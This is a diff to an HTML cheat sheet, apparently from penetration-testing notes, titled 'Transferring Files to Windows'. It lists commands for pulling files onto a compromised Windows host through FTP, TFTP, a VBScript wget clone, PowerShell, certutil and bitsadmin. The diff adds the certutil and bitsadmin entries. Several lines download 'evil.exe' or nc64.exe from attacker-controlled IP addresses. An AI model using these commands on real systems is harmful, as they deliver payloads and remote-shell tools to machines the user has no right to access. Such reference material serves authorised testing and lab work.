@@ -2,13 +2,14 @@
 <html>
 <head>
   <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title> Transferring Files to Windows </title>
 </head>
 <body>
 <h1>
   Transferring Files to Windows
 </h1><br>
-<h5>FTP</h5>
+<h3>FTP</h3>
 <pre>
   echo open 192.168.1.101 21> ftp.txt
   echo USER asshat>> ftp.txt
@@ -20,7 +21,7 @@
   ftp -v -n -s:ftp.txt
 </pre>
 <hr>
-<h5>TFTP</h5>
+<h3>TFTP</h3>
 <p>Windows XP and Windows 2003<br></p>
 <pre>
 #Kali TFTP setup
@@ -46,7 +47,7 @@
   grep 192.168.1.101 /var/log/syslog
 </pre>
 <hr>
-<h5>VBScript</h5>
+<h3>VBScript</h3>
 <pre>
 #Here is a good script to make a wget-clone in VB.
 #If it doesn't work try piping it through unix2dos before copying it.
@@ -79,9 +80,9 @@ echo ts.Close >> wget.vbs
 
 #You then execute the script like this:
 
-  cscript wget.vbs http://192.168.10.5/evil.exe evil.exe</pre>
+  cscript /nologo wget.vbs http://192.168.10.5/evil.exe evil.exe</pre>
 <hr>
-<h5>PowerShell</h5>
+<h3>PowerShell</h3>
 <pre>
 #method 1
 echo $storageDir = $pwd > wget.ps1
@@ -113,6 +114,14 @@ powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.77:8000/nc64.exe' -OutFil
 
 </pre>
 <hr>
-
+<h3>Certutil</h3>
+<pre>
+certutil.exe -urlcache -split -f http://192.168.189.131:7777/evil.exe evil.exe
+</pre>
+<hr>
+<h3>Bitsadmin</h3>
+<pre>
+bitsadmin /transfer evil /download /priority high http://192.168.189.131:9995/evil.exe %temp%\evil.exe
+</pre>
 </body>
 </html>
